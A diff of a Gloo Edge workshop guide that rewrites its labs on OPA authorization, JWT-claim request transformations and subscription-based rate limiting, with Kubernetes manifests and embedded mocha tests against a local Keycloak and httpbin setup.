-This transformation applies to a scenario where you use ExtAuth. Now, you will only simulate the 401.
-
-In Gloo, you can define transformations to happen: 
-- In an `early` stage. Before all filters.
-- In a `regular` stage. After all filters.
-
-> Notice that the response transformation is flagged as `early`. The reason is that an Auth Server returning 401 will cancel any filter or transformation designed to happen after that (`regular` stage). Therefore, you need to prepare the response transformation before the Auth Server filter happens in an `early` stage.
-
-
-```bash
-kubectl apply -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: RouteTable
-metadata:
-  name: httpbin-routetable
-  namespace: team1
-  labels:
-    application-owner: team1
-spec:
-  routes:
-    - matchers:
-        - prefix: /not-secured
-      options:
-        prefixRewrite: '/'
-# ---------------- Transformation ------------------          
-        stagedTransformations:
-          early:
-            responseTransforms:
-            - responseTransformation:
-                transformationTemplate:
-                  parseBodyBehavior: DontParse
-                  body:
-                      text: |
-                            {% if header(":status") == "401" %} 
-                            Hold the horses! You are not authenticated
-                            {% else %}{{ body() }}{% endif %}
-#---------------------------------------------------
-      routeAction:
-          single:
-            upstream:
-              name: team1-httpbin-8000
-              namespace: gloo-system
-EOF
-```
-
-
-With the **httpbin** application, you can simulate that the server returns a 401 status code. Let's run it and see that calling `/status/401`, the returned body is what you expected
-
-```
-curl -v -k $(glooctl proxy url --port https)/not-secured/status/401
-```
-
-And any other status code, returns the expected body:
-
-```
-curl -v -k $(glooctl proxy url --port https)/not-secured/status/200
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("httpbin should return the expected body", () => {
-  it('httpbin returns the transformed body when the status is 401', () => helpers.checkBody({ host: process.env.APP_URL, path: '/not-secured/status/401', body: 'Hold the horses! You are not authenticated', match: true }));
-  it('httpbin returns the transformed body when the status is 200', () => helpers.checkBody({ host: process.env.APP_URL, path: '/not-secured/status/200', body: 'Hold the horses! You are not authenticated', match: false }));
-})
-EOF
-mocha ./test.js --retries=500 2> /dev/null
--->
-
-### Early response transformation
-
-You can also extract information from one header with regular expressions and inject them into another header:
-
-
-```bash
-kubectl apply -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: RouteTable
-metadata:
-  name: httpbin-routetable
-  namespace: team1
-  labels:
-    application-owner: team1
-spec:
-  routes:
-    - matchers:
-        - prefix: /not-secured
-      options:
-        prefixRewrite: '/'
-        stagedTransformations:
-          early:
-# ---------------- Transformation with regex ------------------   
-            requestTransforms:       
-            - requestTransformation:
-                transformationTemplate:
-                  extractors:
-                    apiKey:
-                      header: 'x-my-initial-header'
-                      regex: '^Bearer (.*)$'
-                      subgroup: 1
-                  headers:
-                    x-my-final-header:
-                      text: '{{ apiKey }}'
-#--------------------------------------------------------------
-      routeAction:
-          single:
-            upstream:
-              name: team1-httpbin-8000
-              namespace: gloo-system
-EOF
-```
-
-
-> With the **httpbin** application, calling `/get`, you can debug the request headers. since you are transforming it to add a new header, after running:
-
-```
-curl -k $(glooctl proxy url --port https)/not-secured/get -H "x-my-initial-header: Bearer this_is_my_token_for_test"
-```
-
-You can see the new `X-My-Final-Header` header only with the token:
-
-```
-{
-  "headers": {
-[...]
-    "X-My-Final-Header": "this_is_my_token_for_test", 
-    "X-My-Initial-Header": "Bearer this_is_my_token_for_test"
-  }, 
-[...]
-}
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("httpbin should return the expected header", () => {
-  it('httpbin returns the expected header', () => helpers.checkBody({ host: process.env.APP_URL, path: '/not-secured/get', headers: [{key: 'x-my-initial-header', value: 'Bearer this_is_my_token_for_test'}], body: '"X-My-Final-Header": "this_is_my_token_for_test"', match: true }));
-})
-EOF
-mocha ./test.js --retries=500 2> /dev/null
--->
-
-### Extract information from the JWT token
-
-The JWT token contains a number of claims that you can use to drive RBAC decisions and potentially to provide other input to your upstream systems.
-
-In this case, let's take a closer look at the claims that the Keycloak-generated JWT provides us.  Paste the text of the `Jwt` header into the `Encoded` block at [jwt.io](https://jwt.io), and it will show you the full set of claims available.
-
-![JWT Claims](images/steps/data-transformation/jwt-claims.png)
-
-Let's obtain those claims.
-
-First, you need to assign the value to a variable of the keycloak master realm.   
-
-```bash
-KEYCLOAK_MASTER_REALM_URL=http://$(kubectl get svc keycloak -ojsonpath='{.status.loadBalancer.ingress[0].ip}'):8080/auth/realms/master
-```
-
-Now, you can update the resources to validate the token, extract claims from the token and create new headers based on these claims.
-
-Notice that you will move the `extauth` block to a global location in the resource so that it affects all routes. You want to test this with **httpbin**.
-
-```bash
-kubectl apply -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: VirtualService
-metadata:
-  name: demo
-  namespace: gloo-system
-spec:
-  sslConfig:
-    secretRef:
-      name: upstream-tls
-      namespace: gloo-system  
-  virtualHost:
-    domains:
-      - '*'
-    options:
-#-------------- Moved from specific route to a global place -----------------    
       extauth:
         configRef:
           name: oauth
           namespace: gloo-system
-#----------------------------------------------------------------------------
-#--------------Extract claims-----------------
-      jwt:
-        providers:
-          keycloak:
-            issuer: ${KEYCLOAK_MASTER_REALM_URL}
-            keepToken: true
-            tokenSource:
-              headers:
-              - header: jwt
-            claimsToHeaders:
-            - claim: email
-              header: x-solo-claim-email
-            - claim: email_verified
-              header: x-solo-claim-email-verified
-            jwks:
-              remote:
-                url: http://keycloak.default.svc:8080/auth/realms/master/protocol/openid-connect/certs
-                upstreamRef:
-                  name: default-keycloak-8080
-                  namespace: gloo-system
-#--------------------------------------------- 
-    routes:
-      - matchers:
-          - prefix: /not-secured
-        delegateAction:
-          selector:
-            namespaces:
-              - team1
-            labels:
-              application-owner: team1
-      - matchers:
-          - prefix: /
-        routeAction:
-          single:
-            upstream:
-              name: bookinfo-productpage-9080
-              namespace: gloo-system
 EOF
 ```
 
-Once again, you need to refresh your **bookinfo** application to refresh the token in case it expires.
+The above definitions have a few more changes. We removed the SSL configuration for the `echo` service and we moved the options block in the `vs-httpbin` virtual service from the specific route to the `virtualHost` property, where it applies to all routes of this host.
 
+
+
+
+## Lab 5 - OPA authorization <a name="Lab-5"></a>
+
+
+
+After authenticating an end user request, we can make use of the validated information (claims, profile information, and so on) to authorize his actions. For example, let's allow users to only have READ permissions meanwhile the administrator is allowed to make changes as well.
+
+Gloo Edge uses the [OPA (Open Policy Agent)](https://www.openpolicyagent.org/) and its Rego rules to implement complex access control.
+
+This model allows you to get fine-grained control over the authorization in your applications. Furhtermore, this model is well adopted by the Kubernetes community.
+
+The Rego rules are stored as `ConfigMaps`. 
+For example with the rego rule below we allow all requests with the HTTP method `GET`, meanwhile, any other HTTP methods require that the JWT token has the `group` claim with the value `"admin"`
+
+Apply the policy to the cluster.
+
+```bash
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-access-control
+  namespace: gloo-system
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        input.http_request.method == "GET"
+    }
+    
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.state.jwt)
+        payload["group"] == "admin"
+    }
+EOF
 ```
-/opt/google/chrome/chrome $(glooctl proxy url --port https)/productpage
-```
 
-And now, let's see the results with the fresh token:
-
-```
-/opt/google/chrome/chrome $(glooctl proxy url --port https)/not-secured/get
-```
-
-Here is the output you should get if you refresh the web page:
-
-```
-{
-  "args": {}, 
-  "headers": {
-[...]
-    "X-Solo-Claim-Email": "user1@solo.io", 
-    "X-Solo-Claim-Email-Verified": "false", 
-[...]
-  }, 
-[...]
-}
-```
-
-As you can see, Gloo Edge has added the `x-solo-claim-email` and `x-solo-claim-email-verified` headers using the information it has extracted from the JWT token.
-
-It will allow the application to know the user's email identity and if that email has been verified.
-
-
-
-## Lab 8 - OPA authorization <a name="Lab-8"></a>
-
-Gloo Edge can also be used to set RBAC rules based on [OPA (Open Policy Agent)](https://www.openpolicyagent.org/) and its rego rules.
-
-This model allows you to get fine-grained control over the Authorization in your applications. As well, this model is well adopted by the kubernetes community.
-
-Let's add another configuration to the `AuthConfig` you created in previous Labs:
+Next update the `AuthConfig` definition that we created in previous Labs, to make use of the rego rule.
 
 ```bash
 kubectl apply -f - <<EOF
@@ -1658,7 +1192,7 @@ spec:
   configs:
   - oauth2:
       oidcAuthorizationCode:
-        appUrl: ${APP_URL}
+        appUrl: https://httpbin.solo.io
         callbackPath: /callback
         clientId: ${client}
         clientSecretRef:
@@ -1671,58 +1205,463 @@ spec:
           idTokenHeader: jwt
   - opaAuth:
       modules:
-      - name: allow-solo-email-users
+      - name: httpbin-access-control
         namespace: gloo-system
       query: "data.test.allow == true"
 EOF
 ```
 
-As you can see, you keep the existing keycloak configuration. And you create another config for OPA and its rego rule.
+Let's see how this impacts the application.
+```
+/opt/google/chrome/chrome https://httpbin.solo.io/ 
+```
+After logging in with `user1` / `password` you will be able to view the httbin UI. As well as send GET requests.
 
-Now, let's create the rego rule in a `ConfigMap`, as follows:
+However, when logging in with an administrator account (`admin1` / `password` credentials), you will be able to make POST requests too.
+
+Try that out by opening an incognito window.
+```
+/opt/google/chrome/chrome https://httpbin.solo.io --incognito
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+const helpersHttp = require('./tests/chai-http');
+var chai = require('chai');
+var expect = chai.expect;
+
+describe("user1 who is a regular user", function() {
+  let user = 'user1';
+  let password = 'password';
+  let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
+  let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
+  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
+  
+  it("is authorized to make GET requests", () => helpersHttp.checkWithMethod({ host: "https://httpbin.solo.io", path: "/get", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], method: "get", retCode: 200 }));
+  
+  it("is denied to make POST requests", () => helpersHttp.checkWithMethod({ host: "https://httpbin.solo.io", path: "/post", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], method: "post", retCode: 403 }));
+});
+
+describe("admin1 who is an administrator", function() {
+  let user = 'admin1';
+  let password = 'password';
+  let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
+  let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
+  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
+  
+  it("is authorized to make POST requests", () => helpersHttp.checkWithMethod({ host: "https://httpbin.solo.io", path: "/post", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], method: "post", retCode: 200 }));
+});
+EOF
+echo "executing test gloo-edge/templates/steps/opa-authorization/tests/authorization.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+-->
+
+
+
+
+## Lab 6 - Data Transformations - Request transformations <a name="Lab-6"></a>
+
+In this section you will explore how to transform requests using Gloo Edge. You will frequently encounter requirements that some information has to be added in the request. Frequently, it is not an application concern, such as rate limiting user requests, validating the response that is sent to the user, returning a good looking '404' page, and so on.
+
+The example that we will take in the labs that follow is to rate limit our users based on the email, on their subscription, and the organization.
+
+The information of the email and the subscription are present in the JWT tokens. So we need to use the request transformation capabilities of Gloo Edge to extract those claims and mount those into the request.
+
+### Extract JWT claims and store in HTTP headers
+
+To extract JWT claims and store those in the request headers we got to use the `jwtStaged` property. After authenticating the request this property can be configured to extract the token claims and store those as HTTP Headers. As shown below:
 
 ```bash
+export KEYCLOAK_MASTER_REALM_URL=http://$(kubectl -n keycloak get svc keycloak -ojsonpath='{.status.loadBalancer.ingress[0].ip}'):8080/auth/realms/master
+
 kubectl apply -f - <<EOF
-apiVersion: v1
-data:
-  policy.rego: |-
-    package test
-
-    default allow = false
-
-    allow {
-        [header, payload, signature] = io.jwt.decode(input.state.jwt)
-        endswith(payload["email"], "@solo.io")
-    }
-  
-kind: ConfigMap
+apiVersion: gateway.solo.io/v1
+kind: VirtualService
 metadata:
-  name: allow-solo-email-users
+  name: vs-httpbin
   namespace: gloo-system
+spec:
+  sslConfig:
+    secretRef:
+      name: upstream-tls
+      namespace: gloo-system
+  virtualHost:
+    domains:
+      - 'httpbin.solo.io'
+    routes:
+      - matchers:
+          - prefix: /
+        routeAction:
+          single:
+            upstream:
+              name: httpbin-httpbin-8000
+              namespace: gloo-system
+    options:
+      extauth:
+        configRef:
+          name: oauth
+          namespace: gloo-system
+      jwtStaged:
+        afterExtAuth:
+          providers:
+            keycloak:
+              issuer: ${KEYCLOAK_MASTER_REALM_URL}
+              keepToken: true
+              tokenSource:
+                headers:
+                - header: jwt
+              claimsToHeaders:
+              - claim: email
+                header: x-email
+              - claim: subscription
+                header: x-subscription
+              jwks:
+                remote:
+                  url: http://keycloak.keycloak.svc:8080/auth/realms/master/protocol/openid-connect/certs
+                  upstreamRef:
+                    name: keycloak-keycloak-8080
+                    namespace: gloo-system
 EOF
 ```
 
-Notice that this rule will allow only users with email ending with `@solo.io`
+To verify that the headers were added hit following endpoint:
+```
+/opt/google/chrome/chrome https://httpbin.solo.io/get
+```
 
-Finally, let's update the resources. You will disable RBAC to not interfere with this authorization mechanism:
+Your output too should contain the `X-Email`, `X-Subscription` headers.
+
+```json
+{
+  "args": {}, 
+  "headers": {
+    "Host": "httpbin.solo.io", 
+    "Jwt": "<REDACTED>", 
+      ...
+    "X-Email": "user1@acme.com", 
+    "X-Subscription": "enterprise", 
+    "X-User-Id": "http://172.18.254.176:8080/auth/realms/master;32a4c5b7-275a-4084-bb0f-ac4568c0d24f"
+  }, 
+  "origin": "10.244.0.8", 
+  "url": "https://httpbin.solo.io/get"
+}
+```
+
+### Staged transformations
+
+We need another peace of information in the header and that is the organization. However, the organization is not stored as a claim in the user token. But on closer look we find out that we can derive the organization from the email! Basically `user1@acme.com` is a member of the ACME organization.
+
+Gloo Edge enables us to use request transformers that extract information from the request using regex-es.
+
+For this we got to use Staged Transformers and the transformation MUST occur after the email claim is extracted from the JWT and stored into the header `X-Email`.
+
+The diagram below shows the order in which filters are applied to a request. 
+
+![Order of filters applied to a request](images/6.order-of-filters.png)
+
+So in order for us to extract the organization from the email header. We have to use the "Regular Transformations" as shown in the image. The regular transofmrations are executed after the JWT stage (as shown in the image). 
+
+Putting this together we come up with the virtual service defined below.
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs-httpbin
   namespace: gloo-system
 spec:
   sslConfig:
     secretRef:
       name: upstream-tls
-      namespace: gloo-system  
+      namespace: gloo-system
   virtualHost:
     domains:
-      - '*'
+      - 'httpbin.solo.io'
+    routes:
+      - matchers:
+          - prefix: /
+        routeAction:
+          single:
+            upstream:
+              name: httpbin-httpbin-8000
+              namespace: gloo-system
     options:
-      jwt:
+      extauth:
+        configRef:
+          name: oauth
+          namespace: gloo-system
+# ---------------- Response Transformation ------------------
+      stagedTransformations:
+        regular:
+          requestTransforms:     
+          - requestTransformation:
+              transformationTemplate:
+                extractors:
+                  organization:
+                    header: 'X-Email'
+                    regex: '.*@(.*)$'
+                    subgroup: 1
+                headers:
+                  x-organization:
+                    text: '{{ organization }}'
+#------------------------------------------------------
+      jwtStaged:
+        afterExtAuth:
+          providers:
+            keycloak:
+              issuer: ${KEYCLOAK_MASTER_REALM_URL}
+              keepToken: true
+              tokenSource:
+                headers:
+                - header: jwt
+              claimsToHeaders:
+              - claim: email
+                header: x-email
+              - claim: subscription
+                header: x-subscription
+              jwks:
+                remote:
+                  url: http://keycloak.keycloak.svc:8080/auth/realms/master/protocol/openid-connect/certs
+                  upstreamRef:
+                    name: keycloak-keycloak-8080
+                    namespace: gloo-system
+EOF
+
+```
+
+Now let's print all the headers by querying the `/get` endpoint of `httpbin`.
+```
+/opt/google/chrome/chrome https://httpbin.solo.io/get 
+```
+
+You should see the following output in your browser.
+
+```
+{
+  "args": {}, 
+  "headers": {
+    "Cookie": "id_token=<REDACTED>", 
+    "Host": "httpbin.solo.io", 
+    "Jwt": "<REDACTED>", 
+    "X-Email": "user1@acme.com", 
+    "X-Organization": "acme.com", 
+    "X-Subscription": "enterprise", 
+    "X-User-Id": "http://172.18.254.176:8080/auth/realms/master;e2801a4d-cfc9-479e-9361-7db43d0b4b37"
+  }, 
+}
+```
+
+The output shows that the email, organization, and subscription are all set in the headers, and can be used for rate limiting. 
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+const helpersHttp = require('./tests/chai-http');
+var chai = require('chai');
+var expect = chai.expect;
+
+describe("The request is transformed", function() {
+  let user = 'user1';
+  let password = 'password';
+  let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
+  let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
+  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
+  
+  it("has added the X-Email header", () => helpersHttp.checkBody({ host: "https://httpbin.solo.io", path: "/get", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: "X-Email", retCode: 200 }));
+  
+  it("has added the X-Subscription header", () => helpersHttp.checkBody({ host: "https://httpbin.solo.io", path: "/get", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: "X-Subscription", retCode: 200 }));
+
+  it("has added the X-Organization header", () => helpersHttp.checkBody({ host: "https://httpbin.solo.io", path: "/get", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], body: "X-Organization", retCode: 200 }));
+});
+
+EOF
+echo "executing test gloo-edge/templates/steps/request-transformation/tests/transformations.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
+-->
+
+
+
+
+## Lab 7 - Rate limiting <a name="Lab-7"></a>
+
+
+
+In this step, you are going to use rate limiting to protect or monetize your services.
+
+In our example with `httpbin` we want to achieve the following rate limit configuration:
+* Users of organizations with the `enterprise` subscription have a rate limit of 8 requests per second
+* Users of organizations with the `free` subscription have a rate limit of 2 requests per second
+
+We define those rate limits using the following RateLimitConfig definition:
+
+```bash
+kubectl apply -f - << EOF
+apiVersion: ratelimit.solo.io/v1alpha1
+kind: RateLimitConfig
+metadata:
+  name: limit-users
+  namespace: gloo-system
+spec:
+  raw:
+    setDescriptors:
+    - simpleDescriptors:
+      - key: email-key
+      - key: organization-key
+      - key: subscription-key
+        value: free
+      rateLimit:
+        requestsPerUnit: 2
+        unit: MINUTE
+    - simpleDescriptors:
+      - key: email-key
+      - key: organization-key
+      - key: subscription-key
+        value: enterprise
+      rateLimit:
+        requestsPerUnit: 8
+        unit: MINUTE
+    rateLimits:
+    - setActions:
+      - requestHeaders:
+          headerName: x-email
+          descriptorKey: email-key
+      - requestHeaders:
+          headerName: x-organization
+          descriptorKey: organization-key
+      - requestHeaders:
+          headerName: x-subscription
+          descriptorKey: subscription-key
+EOF
+```
+
+Now let's update the virtual service to make use of the new rate limit.
+
+```bash
+kubectl apply -f - <<EOF
+apiVersion: gateway.solo.io/v1
+kind: VirtualService
+metadata:
+  name: vs-httpbin
+  namespace: gloo-system
+spec:
+  sslConfig:
+    secretRef:
+      name: upstream-tls
+      namespace: gloo-system
+  virtualHost:
+    domains:
+      - 'httpbin.solo.io'
+    routes:
+      - matchers:
+          - prefix: /
+        routeAction:
+          single:
+            upstream:
+              name: httpbin-httpbin-8000
+              namespace: gloo-system
+    options:
+      extauth:
+        configRef:
+          name: oauth
+          namespace: gloo-system
+      stagedTransformations:
+        regular:
+          requestTransforms:     
+          - requestTransformation:
+              transformationTemplate:
+                extractors:
+                  organization:
+                    header: 'X-Email'
+                    regex: '.*@(.*)$'
+                    subgroup: 1
+                headers:
+                  x-organization:
+                    text: '{{ organization }}'
+      jwtStaged:
+        afterExtAuth:
+          providers:
+            keycloak:
+              issuer: ${KEYCLOAK_MASTER_REALM_URL}
+              keepToken: true
+              tokenSource:
+                headers:
+                - header: jwt
+              claimsToHeaders:
+              - claim: email
+                header: x-email
+              - claim: subscription
+                header: x-subscription
+              jwks:
+                remote:
+                  url: http://keycloak.keycloak.svc:8080/auth/realms/master/protocol/openid-connect/certs
+                  upstreamRef:
+                    name: keycloak-keycloak-8080
+                    namespace: gloo-system
+# ---------------- Rate limit config ------------------
+      rateLimitConfigs:
+        refs:
+        - name: limit-users
+          namespace: gloo-system
+#------------------------------------------------------
+EOF
+
+```
+
+With the rate limit applied open the browser and login with `user1` and send 8 requests by just refreshing the page:
+```
+/opt/google/chrome/chrome https://httpbin.solo.io/get
+```
+
+You will see that on the 9th request you will see a 429 status code. Which stands for "Too Many Requests". 
+
+![Browser 429 Too Many Requests Interface](images/429.png)
+
+### Refactor time!
+
+The VirtualService options can be extracted in its own resource called `VirtualHostOptions`. Usually, used when the same set of options has to be applied across different virtual services.
+
+Start by creating the `VirtualHostOption` that contains the extauth, the transformations, and the ratelimiting configuration.
+
+```bash
+
+kubectl apply -f - <<EOF
+apiVersion: gateway.solo.io/v1
+kind: VirtualHostOption
+metadata:
+  name: httpbin-options
+  namespace: gloo-system
+spec:
+  options:
+    extauth:
+      configRef:
+        name: oauth
+        namespace: gloo-system
+    stagedTransformations:
+      regular:
+        requestTransforms:     
+        - requestTransformation:
+            transformationTemplate:
+              extractors:
+                organization:
+                  header: 'X-Email'
+                  regex: '.*@(.*)$'
+                  subgroup: 1
+              headers:
+                x-organization:
+                  text: '{{ organization }}'
+    jwtStaged:
+      afterExtAuth:
         providers:
           keycloak:
             issuer: ${KEYCLOAK_MASTER_REALM_URL}
@@ -1732,54 +1671,56 @@ spec:
               - header: jwt
             claimsToHeaders:
             - claim: email
-              header: x-solo-claim-email
-            - claim: email_verified
-              header: x-solo-claim-email-verified
+              header: x-email
+            - claim: subscription
+              header: x-subscription
             jwks:
               remote:
-                url: http://keycloak.default.svc:8080/auth/realms/master/protocol/openid-connect/certs
+                url: http://keycloak.keycloak.svc:8080/auth/realms/master/protocol/openid-connect/certs
                 upstreamRef:
-                  name: default-keycloak-8080
+                  name: keycloak-keycloak-8080
                   namespace: gloo-system
+    rateLimitConfigs:
+      refs:
+      - name: limit-users
+        namespace: gloo-system
+EOF
+
+```
+
+Next, update the virtual service to reference the newly created `VirtualHostOption`.
+
+```bash
+kubectl apply -f - <<EOF
+apiVersion: gateway.solo.io/v1
+kind: VirtualService
+metadata:
+  name: vs-httpbin
+  namespace: gloo-system
+spec:
+  sslConfig:
+    secretRef:
+      name: upstream-tls
+      namespace: gloo-system
+  virtualHost:
+    domains:
+      - 'httpbin.solo.io'
     routes:
       - matchers:
-          - prefix: /not-secured
-        delegateAction:
-          selector:
-            namespaces:
-              - team1
-            labels:
-              application-owner: team1
-      - matchers:
           - prefix: /
-        options:
-          extauth:
-            configRef:
-              name: oauth
-              namespace: gloo-system
         routeAction:
           single:
             upstream:
-              name: bookinfo-productpage-9080
+              name: httpbin-httpbin-8000
               namespace: gloo-system
+    optionsConfigRefs:
+      delegateOptions:
+        - name: httpbin-options
+          namespace: gloo-system
 EOF
 ```
 
-Let's take a look at what the application returns:
-
-```
-/opt/google/chrome/chrome $(glooctl proxy url --port https)/productpage 
-```
-
-If you login using `user1/password` credentials, you will be able to access since the user's email ends with `@solo.io`
-
-Let's try again in incognito window using the second user's credentials:
-
-```
-/opt/google/chrome/chrome --incognito $(glooctl proxy url --port https)/productpage 
-```
-
-If you open the browser in incognito and login using `user2` / `password` credentials, you will not be able to access since the user's email ends with `@example.com`.
+After the refactoring if you requery the `echo` service, you will see that everything still works the same: the request is authenticated and authorized, claims are extracted and stored as headers, and ratelimiting applies. 
 
 <!--bash
 cat <<'EOF' > ./test.js
@@ -1788,24 +1729,237 @@ const helpersHttp = require('./tests/chai-http');
 var chai = require('chai');
 var expect = chai.expect;
 
-describe("user2 shouln't be authorized", function() {
+describe("The rate limit for free sub users", function() {
   let user = 'user2';
   let password = 'password';
-  let keycloak_svc = chaiExec("kubectl get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
+  let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
   let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
   let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it("user2 isn't authorized", () => helpersHttp.checkURL({ host: process.env.APP_URL, path: '/productpage', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 403 }));
+  
+  it("have only 2 requests per minute", () => {
+    helpersHttp.checkURL({ host: "https://httpbin.solo.io", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 });
+    helpersHttp.checkURL({ host: "https://httpbin.solo.io", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 });
+    helpersHttp.checkURL({ host: "https://httpbin.solo.io", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 });
+  });
+});
+
+describe("The rate limit for enterprise sub users", function() {
+  let user = 'user1';
+  let password = 'password';
+  let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
+  let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
+  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
+  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
+  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
+  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
+  
+  it("have only 8 requests per minute", () => {
+
+    for (let i = 0; i < 8; i++) {
+      helpersHttp.checkURL({ host: "https://httpbin.solo.io", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 });
+    }
+    
+    helpersHttp.checkURL({ host: "https://httpbin.solo.io", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 });
+  });
 });
 EOF
-mocha ./test.js --retries=500 2> /dev/null
+echo "executing test gloo-edge/templates/steps/rate-limiting/tests/subscription-based-rate-limit.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 -->
 
 
 
-## Lab 9 - Observability <a name="Lab-9"></a>
+
+## Lab 8 - Data Transformations - Response transformations <a name="Lab-8"></a>
+
+The similar set of transformations that we observed on the request can also be applied on the response. 
+
+In the following example we demonstrate how to modify a response using Gloo Edge. For example, instead of the default browser error on a 429 response, let's define our own custom page.
+
+```bash
+kubectl apply -f - <<EOF
+
+apiVersion: gateway.solo.io/v1
+kind: VirtualHostOption
+metadata:
